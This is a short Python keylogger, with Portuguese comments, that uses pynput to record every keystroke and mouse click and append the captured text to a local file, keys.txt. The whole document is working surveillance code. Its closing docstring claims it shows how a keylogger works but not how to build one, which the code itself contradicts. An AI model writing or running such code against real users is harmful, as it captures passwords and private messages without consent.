import pyautogui
from pynput import keyboard, mouse

text = ""
caps_lock_on = False

def on_press(key):
    global text, caps_lock_on
    
    try:
        char = key.char
        # verifica se a tecla Caps Lock está ativada
        if caps_lock_on:
            char = char.upper()
        else:
            char = char.lower()
        text += char
    except AttributeError:
        if key == keyboard.Key.space:
            text += " "
        elif key == keyboard.Key.enter:
            text += "\n"
        elif key == keyboard.Key.tab:
            text += "\t"
        elif key == keyboard.Key.backspace:
            text = text[:-1]
        elif key.name == "caps_lock":
            caps_lock_on = not caps_lock_on # inverte o estado do Caps Lock
        elif key.name == "shift":
            pass
        elif key.name == "ctrl":
            pass
        elif key.name == "alt":
            pass
        elif key.name == "cmd":
            pass
        else:
            text += f"[{key.name}]"  

    if key == keyboard.Key.enter:
        with open("keys.txt", "a") as f:
            f.write(text + "\n")
        text = ""

def on_click(x, y, button, pressed):
    global text
    if pressed:
        # Insere um caractere de quebra de linha no texto
        text += "\n"
        with open("keys.txt", "a") as f:
            f.write(text)
        text = ""

# Cria um listener de mouse para detectar cliques
mouse_listener = mouse.Listener(on_click=on_click)
mouse_listener.start()

# Cria um listener de teclado para detectar pressionamentos de tecla
keyboard_listener = keyboard.Listener(on_press=on_press)
keyboard_listener.start()

# Mantém os listeners em execução
keyboard_listener.join()
mouse_listener.join()

"""
Keylogger é um programa criado para gravar tudo o que uma pessoa digita no teclado

Vou mostrar como ele funciona, mas obviamente não vou mostrar como faz!

"""